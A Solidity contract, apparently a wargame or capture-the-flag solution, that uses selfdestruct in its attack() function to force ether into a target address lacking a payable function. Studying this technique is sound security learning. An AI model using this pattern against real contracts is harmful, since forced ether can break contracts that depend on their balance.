// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
  address forceAddress;

  constructor(address _forceAddress) {
    forceAddress = _forceAddress;
  }

  function attack() public payable {
    selfdestruct(payable(forceAddress));
  }
}
